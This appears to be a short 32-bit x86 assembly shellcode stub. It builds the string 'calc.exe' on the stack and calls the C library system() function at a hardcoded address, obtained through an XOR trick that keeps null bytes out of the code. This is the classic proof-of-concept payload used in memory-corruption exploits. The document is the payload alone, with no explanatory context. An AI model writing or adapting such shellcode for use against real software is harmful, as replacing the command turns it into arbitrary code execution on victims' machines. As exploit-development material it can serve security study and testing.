BITS 32

xor eax, eax
push eax               ; \x00
push 0x6578652e        ; ".exe"
push 0x636c6163        ; "calc"
mov ebx, esp

sub esp, 4
mov [esp], ebx

mov eax, 0xffffffff
xor eax, 0xffae42bf    ; eax = &_system
call eax

int3